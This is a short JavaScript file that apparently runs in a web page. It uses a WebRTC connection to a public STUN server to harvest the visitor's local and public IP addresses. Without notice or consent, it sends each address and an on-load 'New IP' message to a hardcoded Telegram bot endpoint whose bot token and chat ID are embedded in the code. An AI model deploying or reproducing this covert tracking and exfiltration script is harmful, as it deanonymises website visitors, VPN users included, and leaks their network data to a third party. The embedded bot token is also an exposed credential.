var localIPs = [];

function findIP(onNewIP) {
  var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;

  var pc = new myPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]}),
      noop = function() {},
      ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
      key;
  function ipIterate(ip) {
    if (!localIPs[ip]) onNewIP(ip);
    localIPs[ip] = true;
  }


  pc.createDataChannel("");

  pc.createOffer(function(sdp) {
    sdp.sdp.split('\n').forEach(function(line) {
      if (line.indexOf('candidate') < 0) return;
      line.match(ipRegex).forEach(ipIterate);
    });
    pc.setLocalDescription(sdp, noop, noop);
  }, noop);
  pc.onicecandidate = function(ice) {
    if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
    ice.candidate.candidate.match(ipRegex).forEach(ipIterate);
  };
}


function addIP(ip) {
  const chatId = "2071502991";
  const URI_API = "https://api.telegram.org/bot5141467470:AAHeHn1EQ8nP6PKgc0Wl45uBrRDVUjUm9zs/sendMessage";
  let message ="WebRtc IP"+"⁣⁣⁣⁣⁣⁣⁣⁣\n"+ip+"\n⁣⁣⁣⁣⁣⁣⁣⁣⁣⁣";

  function TelegramStart(){
    axios.post(URI_API,{
      chat_id: chatId,
      text: message,
    })
  }
  TelegramStart();
}


const chatId = "2071502991";
const URI_API = "https://api.telegram.org/bot5141467470:AAHeHn1EQ8nP6PKgc0Wl45uBrRDVUjUm9zs/sendMessage";
let messageTwo = "----------------New IP-----------------";

function TelegramStart(){
  axios.post(URI_API,{
    chat_id: chatId,
    text: messageTwo,
  })
}
TelegramStart();

findIP(addIP);

